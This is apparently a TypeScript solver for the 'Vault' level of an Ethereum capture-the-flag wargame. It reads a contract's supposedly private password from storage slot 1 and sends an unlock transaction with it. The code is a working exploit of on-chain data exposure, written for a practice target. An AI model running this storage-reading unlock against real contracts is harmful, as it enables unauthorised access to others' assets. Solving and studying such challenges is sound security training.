import { EthereumClient } from '../ethereum/ethereum-client';
import { Attacker } from './attacker-provider';

export const VAULT_LEVEL_NAME = "Vault"

export const  vaultAttacker = (): Attacker => {
    return {
        attack: async (ethereum: EthereumClient, instanceAddress: string) => {
          const password = await ethereum.getStorageValue(instanceAddress, "1");
          const callData = ethereum.createCallData('unlock', ['bytes32'], [password]);
          const attackTx = await ethereum.sendRawTx({to:instanceAddress, data:callData});
          await attackTx.wait();
        }
    }
}